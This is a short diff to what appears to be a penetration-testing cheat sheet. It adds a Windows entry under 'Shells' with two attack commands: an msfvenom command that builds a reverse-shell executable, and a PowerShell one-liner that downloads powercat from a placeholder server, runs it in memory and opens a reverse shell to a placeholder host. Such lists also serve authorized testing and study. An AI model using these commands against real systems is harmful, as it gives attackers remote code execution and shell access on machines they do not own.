@@ -1,5 +1,11 @@
 #### Shells
 
+##### Windows
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>
+IEX (New-Object System.Net.Webclient).DownloadString("http://<server_ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
+```
+
 #### Upgrades
 
 ```
